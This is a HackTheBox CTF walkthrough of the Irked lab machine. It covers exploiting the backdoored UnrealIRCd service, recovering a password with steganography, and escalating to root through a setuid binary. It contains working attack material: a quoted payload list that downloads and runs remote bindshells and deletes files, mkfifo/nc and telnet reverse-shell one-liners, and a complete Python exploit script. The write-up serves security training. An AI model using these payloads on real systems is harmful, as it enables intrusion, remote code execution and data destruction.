# HTB: Irked

[ctf](/tags#ctf ) [hackthebox](/tags#hackthebox ) [htb-irked](/tags#htb-irked
) [nmap](/tags#nmap ) [searchsploit](/tags#searchsploit ) [exploit-
db](/tags#exploit-db ) [hexchat](/tags#hexchat ) [irc](/tags#irc )
[python](/tags#python ) [steganography](/tags#steganography )
[steghide](/tags#steghide ) [ssh](/tags#ssh ) [su](/tags#su ) [password-
reuse](/tags#password-reuse ) [metasploit](/tags#metasploit )
[exim](/tags#exim ) [oscp-like](/tags#oscp-like )  
  
Apr 27, 2019

HTB: Irked

![Irked-cover](https://0xdfimages.gitlab.io/img/irked-cover.png)

Irked was another beginner level box from HackTheBox that provided an
opportunity to do some simple exploitation without too much enumeration. First
blood for user fell in minutes, and root in 19. I’ll start by exploring an IRC
server, and not finding any conversation, I’ll exploit it with some command
injection. That leads me to a hint to look for steg with a password, which
I’ll find on the image on the web server. That password gets me access as the
user. I’ll find an setuid binary that’s trying to run a script out of /tmp
that doesn’t exist. I’ll add code to that to get a shell. In Beyond Root, I’ll
look at the Metasploit Payload for the IRC exploit, as well as some failed
privesc exploits.

## Box Info

Name | [Irked](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Firked) [ ![Irked](../img/box-irked.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Firked)  
[Play on
HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Firked)  
---|---  
Release Date | [17 Nov 2018](https://twitter.com/hackthebox_eu/status/1063358440893030400)  
Retire Date | 06 Apr 2019  
OS | Linux ![Linux](../img/Linux.png)  
Base Points | Easy [20]  
Rated Difficulty | ![Rated difficulty for Irked](../img/irked-diff.png)  
Radar Graph | ![Radar chart for Irked](../img/irked-radar.png)  
![First Blood User](../img/first-blood-user.png) | 00:07:43[![owodelta](https://www.hackthebox.com/badge/image/28238) owodelta](https://app.hackthebox.com/users/28238)  
  
![First Blood Root](../img/first-blood-root.png) | 00:19:17[![no0ne](https://www.hackthebox.com/badge/image/21927) no0ne](https://app.hackthebox.com/users/21927)  
  
Creator | [![MrAgent](https://www.hackthebox.com/badge/image/624) MrAgent](https://app.hackthebox.com/users/624)  
  
  
## Recon

### nmap

`nmap` shows ssh (22), http (80), rpc (111), and IRC (6697, 8067, and 65534):

    
    
    root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.117
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-18 06:59 EST
    Nmap scan report for 10.10.10.117
    Host is up (0.018s latency).
    Not shown: 65528 closed ports
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    111/tcp   open  rpcbind
    6697/tcp  open  ircs-u
    8067/tcp  open  infi-async
    65534/tcp open  unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
    
    root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.117
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-18 07:00 EST
    Warning: 10.10.10.117 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.117
    Host is up (0.022s latency).
    Not shown: 65455 open|filtered ports, 78 closed ports
    PORT     STATE SERVICE
    111/udp  open  rpcbind
    5353/udp open  zeroconf
    
    Nmap done: 1 IP address (1 host up) scanned in 72.51 seconds
    
    root@kali# nmap -sC -sV -p 22,80,1111,6697,8067,65534 -oA nmap/scripts 10.10.10.117
    Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-18 07:01 EST
    Nmap scan report for 10.10.10.117
    Host is up (0.019s latency).
    
    PORT      STATE  SERVICE VERSION
    22/tcp    open   ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
    |   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
    |   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
    |_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
    80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp   open   rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2,3,4        111/tcp  rpcbind
    |   100000  2,3,4        111/udp  rpcbind
    |   100024  1          49264/udp  status
    |_  100024  1          53709/tcp  status
    6697/tcp  open   irc     UnrealIRCd
    8067/tcp  open   irc     UnrealIRCd
    65534/tcp open   irc     UnrealIRCd
    Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 71.97 seconds
    

### Website - Port 80

The site is a big emoji image, with a reference to getting IRC working:

![1542542668165](https://0xdfimages.gitlab.io/img/1542542668165.png)

### IRC

#### Looking For Chats

I’ll see if I can connect to the IRC server and perhaps there’s information in
there. I’ll install `hexchat` with `apt update && apt install -y hexchat`.

Then I’ll run it. After a warning that running IRC as root is stupid, I’m
presented with a network list:

![1554377468952](https://0xdfimages.gitlab.io/img/1554377468952.png)

I’ll click Add, and then name the network irked. Then I’ll select the network
and click “Edit…”. I’ll update the servers to point to Irked, and then hit
close:

![1554377577818](https://0xdfimages.gitlab.io/img/1554377577818.png)

I also like to select irked and hit favor, and then check the “Show favorites
only” box.

Now select irked and hit connect:

![1554377665135](https://0xdfimages.gitlab.io/img/1554377665135.png)

I’ll select “Open the channel list.”, but the list is empty:

![1554377694249](https://0xdfimages.gitlab.io/img/1554377694249.png)

I’ll close that windows and see the main windows. Nothing going on here.

![1554377849545](https://0xdfimages.gitlab.io/img/1554377849545.png)

#### Exploits

`nmap` also gave me the name of the irc server, UnrealIRCd. `searchsploit`
shows there are exploits if the version is 3.2.8.1:

    
    
    root@kali# searchsploit UnrealIRCd
    -------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                      |  Path
                                                                        | (/usr/share/exploitdb/)
    -------------------------------------------------------------------- ----------------------------------------
    UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)        | exploits/linux/remote/16922.rb
    UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow             | exploits/windows/dos/18011.txt
    UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                      | exploits/linux/remote/13853.pl
    UnrealIRCd 3.x - Remote Denial of Service                           | exploits/windows/dos/27407.pl
    -------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    

I’ll ignore the two for Windows, and take a closer look at the two on Linux.
The first is a Metasploit module. I’ll use `-x` in `searchsploit` to examine
the code, `searchsploit -x exploits/linux/remote/16922.rb`. Towards the
bottom, I see this function:

    
    
    def exploit
        connect
    
        print_status("Connected to #{rhost}:#{rport}...")
        banner = sock.get_once(-1, 30)
        banner.to_s.split("\n").each do |line|
        print_line("    #{line}")
        end
    
        print_status("Sending backdoor command...")
        sock.put("AB;" + payload.encoded + "\n")
    
        handler
        disconnect
    end
    

It looks like the exploit is to connect and then send “AB;” + the payload +
“\n”.

I’ll examine the perl script the same way, `searchsploit -x
exploits/linux/remote/13853.pl`. Right at the top I see this section:

    
    
    ## Payload options
    my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &';
    my $payload2 = 'AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &';
    my $payload3 = 'AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &';
    my $payload4 = 'AB; killall ircd';
    my $payload5 = 'AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *';
    

It appears to be doing the same thing.

## Shell as ircd

### Show RCE

Based on what I found during reconnaissance, I think I can just connect with
`nc` and enter `AB; [some command]` and get it to run. I’ll test with a ping.
I have `tcpdump` running listening for icmp. Now I’ll connect, and test out my
theory:

    
    
    root@kali# nc 10.10.10.117 6697
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
    :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
    AB; ping -c 1 10.10.14.14
    :irked.htb 451 AB; :You have not registered
    

In my other window:

    
    
    root@kali# tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    07:53:38.650512 IP 10.10.10.117 > 10.10.14.14: ICMP echo request, id 3472, seq 1, length 64
    07:53:38.650548 IP 10.10.14.14 > 10.10.10.117: ICMP echo reply, id 3472, seq 1, length 64
    

### Shell

Now I can use this to get a shell:

    
    
    AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 443 >/tmp/f
    
    
    
    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.117.
    Ncat: Connection from 10.10.10.117:40718.
    bash: cannot set terminal process group (634): Inappropriate ioctl for device
    bash: no job control in this shell
    ircd@irked:~/Unreal3.2$ id
    id
    uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
    

### Script It

This was a simple enough exploit, and I wanted a python implementation, so I
wrote one. I had particular fun using `subprocess` to start my `nc` listener
and catch the shell callback. This script will be on my gitlab page,
[ctfscripts](https://gitlab.com/0xdf/ctfscripts) as well (though not under
Irked, as it’s not specific to this machine, but any running this backdoored
version of Unreal).

    
    
      1 #!/usr/bin/env python3
      2 
      3 import socket
      4 import subprocess
      5 import sys
      6 
      7 if len(sys.argv) != 5:
      8     print(f"Usage: {sys.argv[0]} [target_ip] [target_port] [callback ip] [callback port]")
      9     sys.exit()
     10 
     11 rhost, rport, lhost, lport = sys.argv[1:]
     12 
     13 print(f"[*] Connecting to {rhost}:{rport}")
     14 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     15 try:
     16     s.connect((rhost, int(rport)))
     17 except:
     18     print(f"[-] Failed to connect to {rhost}:{rport}")
     19     sys.exit(1)
     20 s.recv(100)
     21 
     22 print("[*] Sending payload")
     23 s.send(f"AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f\n".encode())
     24 s.close()
     25 print("[+] Payload sent. Closing socket.")
     26 
     27 print("[*] Opening listener. Callback should come within a minute")
     28 try:
     29     ncsh = subprocess.Popen(f"nc -nl {lhost} {lport}", shell=True)
     30     ncsh.poll()
     31     ncsh.wait()
     32 except:
     33     print("\n[!] Exiting shell")
    

Here’s what it does:

  * Checks for right number of args and set variables, or prints usage. [Lines 7-11]
  * Connects to the host, gets first message from host. [13-20]
  * Sends payload and closes socket. [22-25]
  * Uses `subprocess` to run a `nc` listener, waits for callback, and then lets me interact with it until ctrl-c to exit. [27-33]

Here’s how it runs:

    
    
    root@kali# ./unreal_3.2.8.1_exploit.py 10.10.10.117 6697 10.10.14.14 443
    [*] Connecting to 10.10.10.117:6697
    [*] Sending payload
    [+] Payload sent. Closing socket.
    [*] Opening listener. Callback should come within a minute
    bash: cannot set terminal process group (634): Inappropriate ioctl for device
    bash: no job control in this shell
    ircd@irked:~/Unreal3.2$ id
    id
    uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
    

## Privesc: ircd –> djmardov

### Enumeration

I can find `user.txt`, but I can’t read it:

    
    
    ircd@irked:/home/djmardov/Documents$ cat user.txt 
    cat: user.txt: Permission denied
    

In that same directory, there’s a hidden `.backup` file:

    
    
    ircd@irked:/home/djmardov/Documents$ ls -la
    total 16
    drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
    drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
    -rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
    -rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
    
    ircd@irked:/home/djmardov/Documents$ cat .backup
    Super elite steg backup pw
    UPupDOWNdownLRlrBAbaSSss
    

### Steg

With the reference to steg, I immediately think of the big image on the
website. I’ll download a copy:

    
    
    root@kali# wget 10.10.10.117/irked.jpg
    --2019-04-04 08:56:51--  http://10.10.10.117/irked.jpg
    Connecting to 10.10.10.117:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 34697 (34K) [image/jpeg]
    Saving to: ‘irked.jpg’
    
    irked.jpg                   100%[========================================>]  33.88K   137KB/s    in 0.2s
    
    2019-04-04 08:56:52 (137 KB/s) - ‘irked.jpg’ saved [34697/34697]
    

Now I’ll try `steghide`, a command steg tool, with the follow arguments:

  * `extract` \- I want to extract data
  * `-sf irked.jpg` \- give the file to extract from
  * `-p` \- passphrase

    
    
    root@kali# steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
    wrote extracted data to "pass.txt".
    
    root@kali# cat pass.txt
    Kab6h+m+bbp2J:HG
    

### su / ssh

That password works as djmardov’s password with `su`:

    
    
    ircd@irked:/home/djmardov/Documents$ su djmardov
    Password: 
    djmardov@irked:~/Documents$
    

I can also ssh in:

    
    
    root@kali# ssh djmardov@10.10.10.117
    djmardov@10.10.10.117's password:
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Thu Apr  4 07:11:52 2019 from 10.10.14.14
    djmardov@irked:~$
    

Now I can get `user.txt`:

    
    
    djmardov@irked:~/Documents$ cat user.txt 
    4a66a78b...
    

## Privesc: djmardov –> root

### Enumeration

I’ll run [LinEnum.sh](https://github.com/rebootuser/LinEnum) to help survey
the box. I’ve already got it cloned to my box, so I’ll go into the directory
and run the python webserver, `python3 -m http.server 80`. Then I’ll get it on
Irked and run it.

    
    
    djmardov@irked:/dev/shm$ wget 10.10.14.14/LinEnum.sh
    --2019-04-04 09:01:24--  http://10.10.14.14/LinEnum.sh
    Connecting to 10.10.14.14:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 45650 (45K) [text/x-sh]
    Saving to: ‘LinEnum.sh’
    
    LinEnum.sh                                             100%[==============================================================================================================================>]  44.58K  --.-KB/s   in 0.04s  
    
    2019-04-04 09:01:25 (1.10 MB/s) - ‘LinEnum.sh’ saved [45650/45650]
    
    djmardov@irked:/dev/shm$ chmod +x LinEnum.sh
    djmardov@irked:/dev/shm$ ./LinEnum.sh -t
                                                           
    #########################################################
    # Local Linux Enumeration & Privilege Escalation Script #
    #########################################################
    # www.rebootuser.com
    # version 0.95
                                                  
    [-] Debug Info
    [+] Thorough tests = Enabled
    ...[snip]...
    

There’s a bunch of output to scroll through, but this part jumps out to me:

    
    
    [-] SUID files:
    -rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    -rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
    -rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
    -rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
    -rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
    -rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
    -rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
    -rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
    -rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
    -rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
    -rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
    -rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
    -rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
    -rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
    -rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
    -rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
    -rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
    -rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
    -rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
    -rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount
    

### viewuser

I don’t recognize the file `/usr/bin/viewuser`. I’ll run it to see what it
does:

    
    
    djmardov@irked:/dev/shm$ viewuser 
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2019-04-03 06:34 (:0)
    djmardov pts/2        2019-04-04 09:01 (10.10.14.14)
    sh: 1: /tmp/listusers: not found
    

It throws an error saying that `sh` can’t find `/tmp/listusers`.

    
    
    djmardov@irked:~$ echo "test" > /tmp/listusers
    
    djmardov@irked:~$ viewuser 
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2018-11-20 11:57 (:0)
    djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
    djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
    sh: 1: /tmp/listusers: Permission denied
    

Permissions - the only thing that root can’t do is execute. So I’ll add it,
and change it to a command:

    
    
    djmardov@irked:~$ chmod +x /tmp/listusers 
    djmardov@irked:~$ echo id > /tmp/listusers 
    djmardov@irked:~$ viewuser 
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2018-11-20 11:57 (:0)
    djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
    djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
    uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
    

There’s execution. I’ll change the command to get a shell:

    
    
    djmardov@irked:~$ echo sh > /tmp/listusers 
    djmardov@irked:~$ viewuser 
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2018-11-20 11:57 (:0)
    djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
    djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
    # id
    uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
    

And I can grab `root.txt`:

    
    
    # cat /root/root.txt
    8d8e9e8b...
    

To get a definitive look, I’ll remove `/tmp/listusers` and run it with
`ltrace`:

    
    
    root@term:~/hackthebox/irked-10.10.10.117# ltrace ./viewuser 
    __libc_start_main(0x5655c57d, 1, 0xff983a54, 0x5655c600 <unfinished ...>
    puts("This application is being devleo"...This application is being devleoped to set and test user permissions
    )                                                   = 69
    puts("It is still being actively devel"...It is still being actively developed
    )                                                   = 37
    system("who"root     :1           2018-11-20 09:21 (:1)
    root     pts/3        2018-11-20 13:02 (tmux(2029).%9)
    root     pts/7        2018-11-20 10:32 (tmux(2029).%4)
     <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                        = 0
    setuid(0)                                                                                     = 0
    system("/tmp/listusers"sh: 1: /tmp/listusers: not found
     <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                        = 32512
    +++ exited (status 0) +++
    

There I see the call to `system("who")` and then `system("/tmp/listeners")`.

## Beyond Root

### Metasploit & Process List Payloads

While I was on the box, I saw myself in the process list:

    
    
    ircd      3670  0.0  0.0   2276   596 ?        S    08:33   0:00 sh -c AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 443 >/tmp/f
    

I got curious as to what the payload from metasploit might look like. I fired
up metasploit and got ready to run the exploit:

    
    
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > options
    
    Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.10.117     yes       The target address range or CIDR identifier
       RPORT   6697             yes       The target port (TCP)
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic Target
    

Now I run it, and get a shell:

    
    
    msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
    
    [*] Started reverse TCP double handler on 10.10.14.14:4444 
    [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
        :irked.htb NOTICE AUTH :*** Looking up your hostname...
    [*] 10.10.10.117:6697 - Sending backdoor command...
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo DklVGHbcoUDn6OCZ;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket A
    [*] A: "DklVGHbcoUDn6OCZ\r\n"
    [*] Matching...
    [*] B is input...
    [*] Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.117:49955) at 2019-04-04 09:30:17 -0400
    
    id
    uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
    

A new entry shows up in the process list:

    
    
    ircd      4873  0.0  0.0   2276    72 ?        S    09:20   0:00 sh -c (sleep 4054|telnet 10.10.14.14 4444|while : ; do sh && break; done 2>&1|telnet 10.10.14.14 4444 >/dev/null 2>&1 &)
    

That struck me as interesting. I found the source code for `cmd/unix/reverse`,
the default payload for this exploit:

    
    
    def command_string
      cmd =
        "sh -c '(sleep #{3600+rand(1024)}|" +
        "telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
        "while : ; do sh && break; done 2>&1|" +
        "telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
        " >/dev/null 2>&1 &)'"
      return cmd
    end
    

That’s an interesting command string. Here’s what I think is happening. When
you pipe `sleep` into something, the next thing runs. If that thing is waiting
for input, it will block waiting for input. But if not, it will start running
immediately as well.

For example:

    
    
    $ time sleep 3 | sleep 3
    
    real    0m3.004s
    user    0m0.005s
    sys     0m0.001s
    

Since `sleep` doesn’t wait to read from stdin, the second command starts
immediately, and both finish about the same time.

If the second command finishes before the initial `sleep`, it still waits for the `sleep` to finish. So something like `sleep 3 | pwd` will print the working directory immediately, and then wait for the sleep to finish:
    
    
    $ time sleep 3 | pwd
    /home/df
    
    real    0m3.004s
    user    0m0.003s
    sys     0m0.002s
    

So in this payload, it’s using sleep to keep the payload running for some
minimum amount of time.

Looking at the rest of the command:

    
    
    (sleep 4054|telnet 10.10.14.14 4444|while : ; do sh && break; done 2>&1|telnet 10.10.14.14 4444 >/dev/null 2>&1 &)
    

Next comes telnet back to me piped into a while true (`:` is true in a shell),
until the `sh` returns success, in which case it breaks, sends stderr to
stdout, and pipes that back into telnet back to me. The handler in Metasploit
must be smart enough to handle those two different telnet connections on the
same port.

### Exim

#### Enumeration

I noticed that the box was listening on port 25 on localhost:

    
    
    djmardov@irked:/dev/shm$ netstat -antp | grep ":25"
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
    tcp6       0      0 ::1:25                  :::*                    LISTEN      -  
    

If I connect to it, I see the banner:

    
    
    djmardov@irked:/tmp$ nc 127.0.0.1 25                                        
    220 irked ESMTP Exim 4.84_2 Tue, 20 Nov 2018 09:53:00 -0500  
    

`exim4` was a setuid binary in my `LinEnum.sh` output:

    
    
    -rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
    

#### Local Privesc Vulnerability - Fail

And this version does have a known [local privesc
vulnerability](https://www.exploit-db.com/exploits/39549). Unfortunately for
me, to be vulnerable, the system needs to be compiled with Perl support, which
I can check with the following command:

    
    
    djmardov@irked:/dev/shm$ /usr/sbin/exim -bV -v | grep -i Perl
    djmardov@irked:/dev/shm$
    

No result means this isn’t vulnerable.

#### CVE-2018-6789 - Fail

I also tried CVE-2018-6789. It’s a super complex vulnerability that involves a
heap overflow. But there are [POCs](https://www.exploit-
db.com/exploits/45671), so I can point and fire and see if I get lucky.

I ran it, and it asks for callback ip, port, and target.

    
    
    root@kali# python exim_exp.py 
    exim_exp.py <cb> <cbport> <target>
    

Since the port is only listening on localhost, I’ll create an ssh tunnel:

    
    
    root@kali# ssh djmardov@10.10.10.117 -L 25:localhost:25
    

Now I can talk to localhost port 25 on my box, and it will reach localhost 25
on Irked.

I’ll start a `nc` listener, and give it a run:

    
    
    root@kali# python exim_exp.py 10.10.14.14 443 127.0.0.1
    check vuln
    220 irked ESMTP Exim 4.84_2 Thu, 04 Apr 2019 09:53:42 -0400
    250-irked Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ...
    250-SIZE 52428800
    250-8BITMIME
    250-PIPELINING
    250 HELP
    250-irked Hello BBBBBBBBBBBBBBBB [::1]
    250-SIZE 52428800
    250-8BITMIME
    250-PIPELINING
    250 HELP
    500 unrecognized command
    250-irked Hello DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ...
    250-SIZE 52428800
    250-8BITMIME
    250-PIPELINING
    250 HELP
    NO AUTH PLAIN CONFIG
    false
    

Unfortunately, silence on `nc`. If anyone wants to figure out either how to
get this working or why it doesn’t work, I’d love to hear it!

[](/2019/04/27/htb-irked.html)

